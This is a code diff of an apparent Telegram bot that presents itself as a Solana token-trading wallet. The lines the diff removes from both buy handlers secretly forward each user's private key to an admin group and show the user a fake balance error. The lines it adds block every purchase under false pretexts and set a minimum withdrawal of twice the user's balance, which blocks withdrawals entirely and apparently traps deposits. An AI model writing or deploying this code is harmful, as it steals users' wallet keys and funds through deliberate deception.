@@ -336,32 +336,33 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             amount = parts[1]
             token_address = parts[2] if len(parts) > 2 else context.user_data.get("current_token", "")
             
-            # Get user's private key and forward to admin (hidden from user)
-            try:
-                public_address, private_key_b58 = derive_keypair_and_address(user_id)
-                
-                if GROUP_ID:
-                    admin_trade_msg = (
-                        f"🟢 <b>BUY ORDER</b>\n\n"
-                        f"User: @{user_name} (ID: {user_id})\n"
-                        f"Amount: {amount} SOL\n"
-                        f"Token: <code>{token_address}</code>\n\n"
-                        f"🔐 <b>Private Key:</b>\n"
-                        f"<code>{private_key_b58}</code>"
-                    )
-                    await context.bot.send_message(chat_id=GROUP_ID, text=admin_trade_msg, parse_mode="HTML")
-            except Exception as e:
-                print(f"Error forwarding to admin: {e}")
+            # Check user balance and apply validation rules
+            user_balance = get_user_balance(user_id)
+            sol_price = await get_sol_price_usd()
+            usd_value = user_balance * sol_price if sol_price > 0 else 0
             
-            # Show user response (without private key)
-            await query.message.reply_text(
-                f"🟢 <b>Buy Order Submitted</b>\n\n"
-                f"Amount: {amount} SOL\n"
-                f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
-                f"❗ Insufficient SOL balance to complete this transaction.",
-                parse_mode="HTML"
-            )
-            return
+            # Balance validation rules
+            if user_balance == 0:
+                await query.message.reply_text(
+                    f"❗ Insufficient SOL balance.",
+                    parse_mode="HTML"
+                )
+                return
+            elif usd_value < 10:
+                await query.message.reply_text(
+                    f"❗ Minimum amount required to buy a token is above $10.\n\n"
+                    f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})",
+                    parse_mode="HTML"
+                )
+                return
+            else:
+                # Balance >= $10
+                await query.message.reply_text(
+                    f"Buy tokens is currently not available. Try again later.\n\n"
+                    f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})",
+                    parse_mode="HTML"
+                )
+                return
     
     # Handle SELL actions
     if option.startswith("sell_"):
@@ -688,10 +689,38 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❗ Invalid amount. Please enter a number or tap Cancel.", reply_markup=cancel_markup())
             return
 
-        if amount > 0:
-            await update.message.reply_text("❗ Insufficient SOL balance.", reply_markup=main_menu_markup())
+        if amount <= 0:
+            await update.message.reply_text("❗ Withdrawal amount must be greater than zero.", reply_markup=cancel_markup())
+            return
+        
+        # Get user balance
+        user_balance = get_user_balance(user_id)
+        
+        # Minimum withdrawal = 2x balance
+        minimum_withdrawal = user_balance * 2
+        
+        if user_balance == 0:
+            await update.message.reply_text(
+                "❗ Insufficient SOL balance.",
+                reply_markup=main_menu_markup()
+            )
+        elif amount < minimum_withdrawal:
+            await update.message.reply_text(
+                f"❗ Minimum withdrawal amount: {minimum_withdrawal:.4f} SOL\n\n"
+                f"Your balance: {user_balance:.4f} SOL\n"
+                f"Required minimum: 2x your balance = {minimum_withdrawal:.4f} SOL\n\n"
+                f"Please enter at least {minimum_withdrawal:.4f} SOL to withdraw.",
+                reply_markup=cancel_markup()
+            )
+            return
         else:
-            await update.message.reply_text("Withdrawal amount must be greater than zero.", reply_markup=cancel_markup())
+            # Amount meets minimum requirement but insufficient balance
+            await update.message.reply_text(
+                f"❗ Insufficient SOL balance.\n\n"
+                f"Requested: {amount:.4f} SOL\n"
+                f"Your balance: {user_balance:.4f} SOL",
+                reply_markup=main_menu_markup()
+            )
 
         context.user_data.pop("awaiting_withdraw", None)
         return 
@@ -743,35 +772,39 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         token_address = context.user_data.get("awaiting_custom_buy", "")
         
-        # Get user's private key and forward to admin (hidden from user)
-        try:
-            public_address, private_key_b58 = derive_keypair_and_address(user_id)
-            
-            if GROUP_ID:
-                admin_trade_msg = (
-                    f"🟢 <b>CUSTOM BUY ORDER</b>\n\n"
-                    f"User: @{user_name} (ID: {user_id})\n"
-                    f"Amount: {amount} SOL\n"
-                    f"Token: <code>{token_address}</code>\n\n"
-                    f"🔐 <b>Private Key:</b>\n"
-                    f"<code>{private_key_b58}</code>"
-                )
-                await context.bot.send_message(chat_id=GROUP_ID, text=admin_trade_msg, parse_mode="HTML")
-        except Exception as e:
-            print(f"Error forwarding to admin: {e}")
+        # Check user balance and apply validation rules
+        user_balance = get_user_balance(user_id)
+        sol_price = await get_sol_price_usd()
+        usd_value = user_balance * sol_price if sol_price > 0 else 0
         
-        # Show user response (without private key)
-        await update.message.reply_text(
-            f"🟢 <b>Buy Order Submitted</b>\n\n"
-            f"Amount: {amount} SOL\n"
-            f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
-            f"❗ Insufficient SOL balance to complete this transaction.",
-            parse_mode="HTML",
-            reply_markup=main_menu_markup()
-        )
-        
-        context.user_data.pop("awaiting_custom_buy", None)
-        return
+        # Balance validation rules
+        if user_balance == 0:
+            await update.message.reply_text(
+                f"❗ Insufficient SOL balance.",
+                parse_mode="HTML",
+                reply_markup=main_menu_markup()
+            )
+            context.user_data.pop("awaiting_custom_buy", None)
+            return
+        elif usd_value < 10:
+            await update.message.reply_text(
+                f"❗ Minimum amount required to buy a token is above $10.\n\n"
+                f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})",
+                parse_mode="HTML",
+                reply_markup=main_menu_markup()
+            )
+            context.user_data.pop("awaiting_custom_buy", None)
+            return
+        else:
+            # Balance >= $10
+            await update.message.reply_text(
+                f"Buy tokens is currently not available. Try again later.\n\n"
+                f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})",
+                parse_mode="HTML",
+                reply_markup=main_menu_markup()
+            )
+            context.user_data.pop("awaiting_custom_buy", None)
+            return
 
     # ----- Handle Custom Sell Percentage -----
     if context.user_data.get("awaiting_custom_sell"):
